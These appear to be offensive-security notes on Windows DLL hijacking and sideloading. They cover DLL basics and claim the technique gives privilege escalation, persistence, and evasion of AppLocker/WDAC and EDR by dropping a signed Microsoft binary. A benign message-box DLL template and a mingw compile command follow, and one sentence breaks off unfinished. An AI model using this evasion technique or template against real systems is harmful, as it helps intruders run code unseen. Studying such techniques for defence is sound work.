# DLL Hijacking/Sideloading

> WHAT ARE DLLs : At its core, a Dynamic Link Library (DLL) is a file containing code and data that multiple programs can use simultaneously. DLLs are a crucial component in the Windows operating system because Windows heavily relies on them for pretty much anything. Think of it as a shared repository of functionality, accessible to any application that needs it. Unlike static libraries, which are integrated into an application at compile time, DLLs are loaded into memory at runtime, providing a level of flexibility and modularity that is essential for software integrity. Each process started on Windows uses DLLs in order to operate properly. Additionally, DLLs can be also custom made, which means that for different software vendors, dedicated DLLs can be encountered. Usually they are programmed in C/C++, however, this is not the only option. 

> ***IMPORTANT***: We achieve not only `Privilege Escalation`, but also `code-execution` and `persistence`!!!

> Additionally, DLL Hijacking bypasses application whitelisteng (applocker/WDAC) and breaks the EDR execution chain, as the DLL is loaded by a signed microsoft executable (i.e. Onedrive), dns/http requests are no longer abnormal

# DLL Hijack/Sideloading
<https://www.bordergate.co.uk/windows-privilege-escalation/#DLL-Hijacking>
The following code can be used to create a malicious DLL:

Bring your own vulnerable signed MS binary:

OLEVIEW

Why? EDR's will check if dll's loaded by LOL windows binaries happen from the right directory - by dropping a signed binary that is not present on the file system, we evding that detection.

Additionally OLEVIEW will

```c
#include <windows.h>

BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID p) {
    if (r == DLL_PROCESS_ATTACH) {
        MessageBoxW(NULL, L"DLL sideload successful!", L"Debug", MB_OK | MB_ICONINFORMATION);
    }
    return TRUE;
}
```
Compile with:

```code
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijack.dll
```